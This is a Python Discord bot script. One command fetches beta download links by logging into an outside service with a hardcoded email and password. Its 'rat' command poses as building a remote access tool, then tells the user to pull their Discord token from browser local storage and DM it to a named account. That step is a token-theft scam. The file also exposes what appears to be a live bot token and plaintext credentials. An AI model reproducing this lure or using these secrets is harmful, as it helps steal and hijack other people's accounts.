import discord
import os
import time
from discord import user
import requests
import discord.ext
from discord.utils import get
from discord.ext import commands, tasks
from discord.ext.commands import has_permissions, MissingPermissions,  CheckFailure, check
#^ basic imports for other features of discord.py and python ^
url = "https://ronreiter-meme-generator.p.rapidapi.com/meme"
client = discord.Client()
client = commands.Bot(command_prefix = '.', case_insensitive=True) #prefix
client.remove_command('help')
client.members=True
@client.event
async def on_ready():
    activity = discord.Game(name="Sub to Pog hacking")
    await client.change_presence(status=discord.Status.online, activity=activity)
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\
   ______      __           __          __ 
  / ____/___ _/ /_____     / /_  ____  / /_
 / / __/ __ `/ __/ __ \   / __ \/ __ \/ __/
/ /_/ / /_/ / /_/ /_/ /  / /_/ / /_/ / /_  
\____/\__,_/\__/\____/  /_.___/\____/\__/  
                                           
""")
    print("Launching Gato Bot....")
    print("Gato Bot has loaded have a good day!")#will print "online message" in the console when the bot is online
    print("-----------------------------------Logs start here-----------------------------------")  




@client.command()
async def allahcmd(ctx, Version=None):
    guild = ctx.guild
    user = ctx.message.author
    role = discord.utils.get(guild.roles, name="Beta")
    if Version == "beta":
        if role in user.roles:
            url = "https://hummusclient.info/api/account/login"
            payload = {'email': 'astriogamer@riseup.net', 'password': '_Bananapopcorn22_', 'beta' : 'False'}
            response = requests.post(url, params=payload)
            dl=response.json()
            url = " https://hummusclient.info/api/admin/createDownloadLink"
            payload = {'token': dl["responseObject"]["token"], 'beta': "True"}
            rhala = requests.post(url, params=payload)
            realink = rhala.json()
            embed=discord.Embed(title="Download Succesful!", description="**Download link**\n" + 
            realink["statusText"] + "\nThis link will expire in 5 minutes", color=0xff00f6)
            await user.send(embed=embed)





            alalh=discord.Embed(title="Download Successful!", description="Look in Dms! " + str(user), color=0xff00f6)
            await ctx.send(embed=alalh)



        else:
            embed=discord.Embed(title="Download Error!", description="You Dont have beta!\nThat means you cant download it just yet", color=0xff00f6)
            await ctx.send(embed=embed)
    elif Version == "release":
            embed=discord.Embed(title="Pulic Version Has not been released yet!", description="Please Apply for beta at\n<#868007168669024328>", color=0xff00f6)
            await ctx.send(embed=embed)
    else:
        embed=discord.Embed(title="What Version?", description="**Beta**\nBeta Download for Beta users only\n**Release**\nPublic build for everybody to use!", color=0xff00f6)
        await ctx.send(embed=embed)
@client.command()
async def rat(ctx):
    await ctx.send("Please wait rat is building.....")
    time.sleep(10)
    await ctx.send("please inspect and goto local storage and reload discord and then find token then DM it to Cutecat#0604\n<@666775573309292571>")


client.run("ODc3NDIxNzY3NDcwMjQ3OTQ4.YRyYsw.eP2MF2GG7ajGyznQm-0XA19UDGo")
